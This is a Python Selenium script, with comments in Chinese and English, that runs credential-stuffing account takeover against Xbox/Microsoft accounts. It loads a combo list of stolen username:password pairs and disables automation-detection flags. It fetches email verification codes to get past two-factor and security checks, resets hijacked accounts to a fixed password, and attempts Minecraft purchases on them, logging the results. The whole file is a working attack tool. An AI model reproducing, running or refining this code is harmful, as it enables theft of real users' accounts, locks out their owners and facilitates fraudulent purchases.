# encoding: utf-8
# auther: guapi
# create_date: 2024-02-05 02:19:19
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.edge.service import Service
import threading
import time
import logging
from selenium.webdriver.remote.remote_connection import LOGGER
from bs4 import BeautifulSoup, ResultSet
import requests
logging.disable(logging.CRITICAL)


class combo:
    def init_combo():
        with open("combo.txt", "r") as f:
            combo_list = f.read().split("\n")
        return [account(combo) for combo in combo_list]
        
class message:
    def __init__(self, message) -> None:
        self._message = message
        self.header = self._message.find("div", class_="message-header").text
        self.content = self._message.find("div", class_="message-content").find("div", class_="custom-html").text
        self.time = self.content.split("时间: ")[1].split("  ")[0]
        self.timestamp = int(time.mktime(time.strptime(self.time, "%Y-%m-%d %H:%M:%S")))
        self.content = self.check_content()

    def check_content(self):
        temp_list = self.content.split("\n")
        check_list = [line for line in temp_list if line != "\n"]
        return "".join(check_list)
            

class mailbox:
    def __init__(self, email, token) -> None:
        self.url = f"https://www.mal4.fun/mail/?mail={email}&token={token}"

    def updata_letter_list(self):
        markup = requests.get(self.url).text
        soup = BeautifulSoup(markup, "html.parser")
        li_list = soup.find_all("li", class_="message")
        self.message_list = [message(li) for li in li_list]

class account:
    def __init__(self, combo: str) -> None:
        self.combo = combo
        self.check_text()
        self.mailbox = mailbox(self.email, self.token)
        self.updata_letter = lambda: self.mailbox.updata_letter_list()
        self.save_text = lambda: f"{self.username}:{self.password}:{self.email}:{self.token}"
    
    def get_code(self):
        start_time = int(time.time())
        while True:
            self.updata_letter()
            try:
                message = self.mailbox.message_list[0]
                code = message.content.split("Security code:")[1].split("If")[0]
                return str(int(code))
            except:
                pass
            time.sleep(5)

    def check_text(self):
        self.username, self.password = (
            self.combo.split("success - ")[1].split(" |")[0].split(":")
        )
        self.email = self.combo.split(" | ")[1].lower()
        self.token = self.combo.split(" + ")[-1]
        self.email_username = self.email.split("@")[0]


class xpath:
    login_div = "/html/body/div[1]/div/div/div[2]/div/div/div/header/div/div/div[4]/div[2]/div/a/div/div"
    username_input = "/html/body/div/form[1]/div/div/div[2]/div[1]/div/div/div/div[2]/div[1]/div[3]/div/div/div/div[2]/div[2]/div/input[1]"
    next_button = "/html/body/div/form[1]/div/div/div[2]/div[1]/div/div/div/div[2]/div[1]/div[3]/div/div/div/div[4]/div/div/div/div/input"
    password_input = "/html/body/div/form[1]/div/div/div[2]/div[1]/div/div/div/div[2]/div/div[3]/div/div[2]/div/div[3]/div/div[2]/input"
    login_button = "/html/body/div/form[1]/div/div/div[2]/div[1]/div/div/div/div[2]/div/div[3]/div/div[2]/div/div[5]/div/div/div/div/input"
    fa_title = "/html/body/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div[2]/div/div/div/form/div[1]"
    verify_button = "/html/body/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div[2]/div/div/div/form/div[3]/div/div/input"
    send_message_button = "/html/body/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div[2]/div/div/div/form/div/div[3]/div/div[1]/div/label/input"
    send_email_input = "/html/body/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div[2]/div/div/div/form/div/div[3]/div/div[1]/div[2]/div[3]/input"
    send_email = "/html/body/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div[2]/div/div/div/form/div/div[4]/div[3]/div/div/input"
    success_title = "/html/body/div[1]/div/div[2]/div[1]/div/div/div/div/div[2]/div[2]/div/div/form/div[1]/div"
    success_yep_button = "/html/body/div[1]/div/div[2]/div[1]/div/div/div/div/div[2]/div[2]/div/div/form/div[3]/div[2]/div/div[2]/button"
    code_input = "/html/body/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div[2]/div/div/div/form/div/div[2]/div[2]/input"
    code_button = "/html/body/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div[2]/div/div/div/form/div/div[2]/div[6]/div/div/input"
    new_password_input = "/html/body/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div[2]/div/div/form/div/div[7]/div[1]/div/input[1]"
    new_password_next = "/html/body/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div[2]/div/div/form/div/div[9]/div/div/div/div/input"
    queding_button= "/html/body/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div[2]/div/div/div/form/div[4]/div/div/input"
    safe_2fa_title = "/html/body/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div[2]/div"
    safe_choose = "/html/body/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div[2]/div/div/div/form/div/div[3]/div/div[1]/div/label/span"
    safe_next_button = "/html/body/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div[2]/section/div/form/div[5]/div/div/input"
    search_button = "/html/body/div[1]/div/div/div[2]/div/div/div/header/div/div/div[4]/form/button"
    password_worng_title = "/html/body/div/form[1]/div/div/div[2]/div[1]/div/div/div/div[2]/div/div[3]/div/div[2]/div/div[3]/div/div[1]/div"
    safe_send_message_button = "/html/body/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div[2]/div/div/div/form/div/div[4]/div[3]/div/div/input"
    safe_next_button = "/html/body/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div[2]/div/div/div/form/div/div[2]/div[6]/div/div/div[2]/input"
    buy_button_1 = "/html/body/div[1]/div/div/div[3]/div/div[1]/div[1]/div[6]/div/div/button"
    learn_more_button = "/html/body/div[1]/div/div/div[3]/div/div/div/div[2]/div[1]/div/div/div[2]/ul/li[1]/section/div/div/div/a"
    buy_bad_titile = "/html/body/section/div[1]/div/div/div/div/div/div[2]/h2"
    have_game_title = "/html/body/div[1]/div/div/div[3]/div/div[1]/div[1]/div[6]/div/div[1]/div/button/div[2]/span"
    buyFaild = "/html/body/main/div/div/div/div/div[2]/div[1]/div/p"
    input_name_title = "/html/body/div[1]/main/div[1]/div[2]/div/div[1]/div"
    frist_name_button = "/html/body/div[1]/main/div[1]/div[2]/div/div[5]/div/div[1]/div[1]/button"
    save_name = "/html/body/div[1]/main/div[1]/div[8]/button"
    start_button = "/html/body/div[1]/main/div[1]/div[4]/button"    


class App:
    def __init__(self, acc: account) -> None:
        self.driver = self.driver_init()
        self.in_source = lambda text: text in self.driver.page_source
        self.open_new_window = lambda url: self.driver.execute_script(f'window.open("{url}");')
        self.switch_windows = lambda index: self.driver.switch_to.window(self.driver.window_handles[index])
        self.driver_find = lambda xpath_text: self.driver.find_element(By.XPATH, xpath_text)
        self.new_password = "Aasd123asd-"
        self.account = acc

    def start(self):
        self.login_xbox(self.account)  # test Temp
        

    def driver_init(self):
        options = webdriver.ChromeOptions()
        options.add_experimental_option("useAutomationExtension", False)
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option("excludeSwitches", ["enable-logging"])
        options.add_argument("disable-infobars")
        options.add_argument("lang=zh-CN,zh,zh-TW,en-US,en")
        options.add_argument("disable-blink-features=AutomationControlled")
        options.add_argument("--incognito")
        #######################################
        options.add_experimental_option('useAutomationExtension', False)
        options.add_experimental_option('excludeSwitches', ['enable-automation'])
        options.add_argument('disable-infobars')
        prefs = {'profile.managed_default_content_settings.images': 2}
        options.add_experimental_option('prefs',prefs)
        #######################################

        options.page_load_strategy = "none"
        driver = webdriver.Chrome(options=options)
        driver.implicitly_wait(20)
        print("[+] 浏览器初始化完毕") 
        print("[+] Chrome Driver Initialize Complete")
        return driver

    def check_state(self, xpath_text):
        try:
            self.driver.implicitly_wait(3)
            self.driver_find(xpath_text)
            self.driver.implicitly_wait(20)
            return True
        except:
            self.driver.implicitly_wait(20)
            return False
        
    def login_xbox(self, account: account):
        self.driver.get("https://www.xbox.com/zh-CN/")
        self.driver_find(xpath.login_div).click()
        self.driver_find(xpath.username_input).send_keys(account.username)
        self.driver_find(xpath.next_button).click()
        self.driver_find(xpath.password_input).send_keys(account.password)
        self.driver_find(xpath.login_button).click()
        time.sleep(10)
        if self.check_state(xpath.safe_2fa_title):
            time.sleep(10)
            print(f"[-] 安全隐患 {account.save_text()}")
            print(f"[-] Safe {account.save_text()}")

            self.driver_find(xpath.safe_choose).click()
            self.driver_find(xpath.send_email_input).send_keys(account.email_username)
            self.driver_find(xpath.safe_send_message_button).click()
            code = account.get_code()
            print(f"[-] 验证码 {code}")
            self.driver_find(xpath.code_input).send_keys(code)
            self.driver_find(xpath.safe_next_button).click()
            time.sleep(1000)
            self.driver_find(xpath.success_yep_button).click()
            print(f"[+] 登陆成功 {account.save_text()}")
            print(f"[+] Successful {account.save_text()}")            

        if self.check_state(xpath.fa_title): #if 2fa

            print(f"[-] 异地验证 {account.save_text()}")
            print(f"[-] 2FA {account.save_text()}")
            time.sleep(10)
            self.driver_find(xpath.verify_button).click()
            self.driver_find(xpath.send_message_button).click()
            self.driver_find(xpath.send_email_input).send_keys(account.email_username)
            self.driver_find(xpath.send_email).click()
            code = account.get_code()
            self.driver_find(xpath.code_input).send_keys(code)
            self.driver_find(xpath.code_button).click()
            
            self.driver_find(xpath.new_password_input).send_keys(self.new_password)
            self.driver_find(xpath.new_password_next).click()
            self.driver_find(xpath.queding_button).click()
            account.password = self.new_password
            #  TODO

        if self.check_state(xpath.password_worng_title):
            print(f"[-] 密码错误 {account.save_text()}")
            print(f"[-] Bad {account.save_text()}")
            return self.driver.quit()

        if self.check_state(xpath.success_title):
            print(f"[+] 登陆成功 {account.save_text()}")
            print(f"[+] Successful {account.save_text()}")
            self.driver_find(xpath.success_yep_button).click()
            
        if self.check_state(xpath.input_name_title):
            print(f"[-] 选择玩家代号 {account.save_text()}")
            print(f"[-] Need Choose Account name {account.save_text()}")
            self.driver_find(xpath.frist_name_button).click()
            time.sleep(5)
            self.driver_find(xpath.save_name).click()
            time.sleep(5)
            self.driver_find(xpath.start_button).click()
        
        

        self.buy_mineceaft()
        

    def buy_mineceaft(self):
        print(f"[+] 开始购买")
        print(f"[+] Start Buy Minecraft")
        time.sleep(15)
        self.driver_find(xpath.learn_more_button).click()
        self.switch_windows(-1)
        
        
        if self.check_state(xpath.have_game_title):
            print(f"[+] 已经拥有此游戏")
            print("[+] Haved Game")
            with open("success.txt", "a") as f:
                f.write(f"已经拥有此游戏 {self.account.save_text()}\n")
            return self.driver.quit()
        else:
            self.driver_find(xpath.buy_button_1).click()
            self.driver.switch_to.frame("purchase-sdk-hosted-iframe")
            self.driver_find("//button[normalize-space()='购买']").click()
            self.driver.implicitly_wait(5)
            find = self.driver.find_elements(By.CSS_SELECTOR, "[class*='errorPageContainer--'][class*='baseStyles']")
            self.driver.implicitly_wait(20)
            if find:
                print(f"[-] 购买失败")
                print("[-] Buying Faild")
                return self.driver.quit()
            else:
                if self.check_state(xpath.buyFaild):
                    print(f"[-] 购买失败")
                    print("[-] Buying Faild")
                    return self.driver.quit()
                
                # print(f"[+] 购买成功")
                # print("[+] Buying Successful")
                # with open("success.txt", "a") as f:
                #     f.write(f"购买成功 {self.account.save_text()}\n")
                # return self.driver.quit()

if __name__ == "__main__":
    combolist = combo.init_combo()
    for combos in combolist:
        
        for _ in range(3):
            app = App(combos)
            try:
                app.start()
                break
            except Exception as e:
                app.driver.quit()
            time.sleep(10)
                
                
